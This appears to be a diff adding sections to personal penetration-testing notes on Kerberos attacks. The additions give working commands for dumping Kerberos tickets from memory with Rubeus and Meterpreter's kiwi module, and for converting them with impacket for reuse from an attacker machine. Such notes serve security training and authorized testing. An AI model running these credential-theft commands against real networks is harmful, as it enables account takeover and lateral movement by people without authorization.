@@ -202,6 +202,24 @@ client requests access to an application within a domain using Kerberos:
       if the user's group memberships match the group memberships specified in
       the service ticket
 
+### Stealing TGTs from memory
+
+We can use toolkits like [Rubeus](https://github.com/GhostPack/Rubeus) to dump
+TGTs from memory when a user authenticates to Kerberos. We can invoke a monitor
+to dump TGTs live with the following:
+
+```powershell
+Start-Process `
+	-FilePath "Rubeus.exe" `
+	-ArgumentList @(
+		"monitor",
+		"/interval:1"
+	)
+```
+
+[Here's a great guide ](https://tw1sm.github.io/2021-02-01-kerberos-conversion/)on
+how to use the Base64 TGTs dumped by this toolkit.
+
 ## Mimikatz
 
 **Mimikatz** extracts cached credentials from memory, thanks to the way Kerberos
@@ -311,4 +329,22 @@ class Program
         );
     }
 }
+```
+
+### Acquiring tickets
+
+In an administrative meterpreter session on a Windows target, we can attempt to
+dump all Kerberos tickets from memory to acquire TGTs by invoking the following:
+
+```bash
+meterpreter> kiwi_cmd "sekurlsa::tickets /export"
+```
+
+We can copy paste the Base64 dumps of these tickets to convert them to
+**ccache** files for use on our Kali machine with **impacket** by invoking the
+following:
+
+```bash
+base64 -d ${BASE64_TGT} > ${OUTFILE}.kirbi
+python /usr/share/doc/python3-impacket/examples/ticketConverter.py ${OUTFILE}.kirbi ${OUTFILE}.ccache
 ```
